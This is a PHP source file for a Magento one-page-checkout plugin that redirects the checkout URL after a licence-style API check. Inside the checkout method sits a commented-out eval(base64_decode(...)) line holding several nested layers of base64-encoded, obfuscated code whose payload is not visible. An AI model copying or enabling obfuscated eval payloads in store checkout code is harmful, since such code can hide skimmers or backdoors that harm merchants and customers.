<?php

namespace IWD\Opc\Plugin\Checkout;

use IWD\Opc\Helper\Data as OpcHelper;
use Magento\Framework\UrlInterface;

class DefaultConfigProvider
{
    public $opcHelper;
    public $url;

    public function __construct(
        OpcHelper $opcHelper,
        UrlInterface $url
    ) {
        $this->opcHelper = $opcHelper;
        $this->url = $url;
    }

    public function afterGetCheckoutUrl($subject, $result)
    {
//        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSWGRHRlhWbGw0V2tkMFZWSnJWalJWTVdoclYyeGFXRlZ1Y0dGV00xRXdWbXhWTVZkV1pIUmpSazVPVWtaYVRGWnFTalJoTURWSVZWaG9hbEp0ZUZWV01GcExWV3hzYzFwRVVrOWlSbHA2VjFod1IyRkdTblJsUkVKaFZsZFJNRlpGV2tabFYxSkdUMVpLVG1KWWFFUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlhSbG8yVW10MFZsWkZTbGhhUjNoUFkyMUdSMVJ0YkU1aE1YQmhWbXRhYjFVeFZsaFRiRlpwVWtVMVdWWnJWa3RrYkd4eVdrVjBWRlpyV2pCYVZXUjNZVVphUmxKdWJGaFdiSEIyVmtSR1QxSXlTa2RYYkU1cFZqTm9WVlp0TlhkV01rbDRXa1pvVGxaR1NuQlZiR2hUVWxac1ZWTnRkRlJOYTFwWVdXdGpNVlpIUlhsaFJsSmFZV3R3U0ZZeFdsTlhWbFp6VW0xc1YxSXpaRFpXYWtaVFVUSkplVk5yYUZSaE1uaFRXV3hvYjJOV2JGZFZhMHBxWWtkU2VGVXllR3RVYkVweVlrUldWbUpZVWt4V01qRkdaREExVlZOc2FHaE5iRXBZVjFkd1EwMUdXa2hTV0hCU1lUTkNWVlV3VlRGVlJsWlZVMjVPVW1KSE9UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJVWk9Vak5vUmxac1l6RmpNV3hYV2tWYVQxWkZOV0ZaVjNSeVpVWndXR1ZJWkZkU2ExcFdXV3RXZDFWck1WWmlSRTVZVm14YWNsbDZTbGRqYlZaSFZtczVXRkp1UW5oV1YzQkNUVlpPYzFwSVRtRlNSa3B5VkZab1ExZHNWWGhoUms1V1ZqQndlVmt3YUU5WGF6RllZVVpvV21FeVVrOWFWM2hYWXpGYWRHSkZOVk5XYlRrMlZqRmFZVlF5U25SVWExcFFWa1UxVDFWc2FGTlRNVlpWVVd0a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1ReFNuUk9WbkJYWWxaS2FGWXljRU5OUmtwSFZtNVdhVkl3V2xsVmJGSldaV3hrV0dORmNFNVdNVnA2V1RCYWEyRnJNWEZXYmtaVlZqTm9hRmt4V25KbFZURlhXa1UxVTJFeFdURldSRVpyVFVac1YxWlliRlppV0ZKVlZteGFSMDB4VVhoWGEwNVhVbXRhV1ZSc1pHOVhSa2w0VTI1c1YxSXpVbkpVVldSVFpFWldjbHBHUWxoVFJVcDVWbTF3UWsxWFRsZGFTRTVvVWxSc2MxbFVUa0pOVm14VlUyMTBhVkl4U1RKVlYzUTBWa1phVms1VlRsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYVZKV1NsTldha3BUVXpGV1ZWSnJkRTlXYlZKNldWVlZOVlJzV1hkalJYQlhWbTFTY2xaV1dsWmtNVXAxVTIxR1UxWXhTakpYVkVKclZEQTFWazFWVW10U00xSlpWV3hvUTA1c1drWlhiRXBPVmpCd2Vsa3dXbk5XYlVwSFkwaEdXbUpIYUhKYVIzaFBZMVpPVlZadGRGZGlhMHBoVmxaamVHSXhiRlpOV0U1WFlteGFWVlJXV2t0T2JGcElaRVU1YWxKcldsbFhhMVozVldzeFJsZHVWbFpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaVVFsTlJNVkY0VWxoc2FWSlZjR2hVVldRMFVsWldWMXBIZEZSaVJWWXpWVzB3TVZsWFNrWldWRlpXVW1zMWNWa3dWakJXVjA0MlRVYzFURlV5Y3pOS2VXdHdUM2M5UFNjcEtUcz0nKSk7'));

        if ($this->opcHelper->isEnable()
            && !($this->opcHelper->isGaAbEnable() && $this->opcHelper->getGaAbCode())) {
            $response = $this->opcHelper->requestToApi();
            if ($response['secretCode'] === 'iwd4kot_success') {
                $result = $this->url->getUrl('onepage');
            }
        }
        return $result;
    }
}
